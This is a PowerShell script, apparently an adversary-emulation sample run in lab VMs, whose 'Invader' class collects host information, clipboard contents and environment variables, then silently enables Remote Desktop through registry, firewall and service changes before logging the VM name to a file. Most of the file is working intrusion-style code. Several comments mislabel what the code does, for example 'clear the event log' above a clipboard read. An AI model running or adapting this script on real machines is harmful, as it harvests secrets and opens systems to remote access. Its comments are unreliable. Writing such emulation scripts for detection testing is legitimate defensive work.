class Invader{
    
    [int32]$time

    Invader(){}
    # grab user
    [string] grabUser(){
        $unrefineduser = whoami.exe
        $userArr = $unrefineduser -split "\\"
        return $userArr[1]
    }
    # sleep for this amount of time
    sleep([int]$min, [int]$max){
        $this.time = Get-Random -Minimum $min -Maximum $max
        Start-Sleep -Seconds $this.time
    }
    #attempt to check the shared drives
    get_ip(){
        ipconfig /all
    }
    # attempt to clear the event log, catch if restricted
    get_clipboard(){
        Get-Clipboard
    } 
    # download a file, extract it, set registry key, remove evidence
    enable_rdp(){
        try {
            # Enable RDP in the registry
            Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0 -ErrorAction Stop
            Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -value 1 -ErrorAction Stop

            # Configure the firewall to allow RDP
            Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction Stop

            # Set the Remote Desktop Services to auto-start and start the service
            Set-Service -Name TermService -StartupType Automatic -ErrorAction Stop
            Start-Service -Name TermService -ErrorAction Stop

        } catch {
            if ($_.Exception -is [System.Security.SecurityException] -or $_.Exception -is [System.UnauthorizedAccessException]) {
                ""
            } else {
                ""
            }
        }
    }

    # check environment variables
    check_env(){
        Get-ChildItem Env:
    }
}
# do stuff
$Invade = New-Object -TypeName Invader
$Invade.sleep(10,20)
$Invade.get_ip()
$Invade.sleep(10,20)
$Invade.get_clipboard()
$Invade.sleep(10,20)
$Invade.enable_rdp()
$Invade.sleep(10,20)
$Invade.check_env()


# Logging starts here
# Get VM unique identifier, current time, and script name
$vmID = (Get-WmiObject -Class Win32_ComputerSystem).Name
$currentTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
$scriptName = $MyInvocation.MyCommand.Name

# Define the path for the log file
$logPath = "C:\Users\User1\Desktop\logs\logFile.log"

# Format the log entry
$logEntry = "VM ID: $vmID, Time: $currentTime, Script: $scriptName"

# Write log entry to the log file
Add-Content -Path $logPath -Value $logEntry


Write-Host "Log file saved."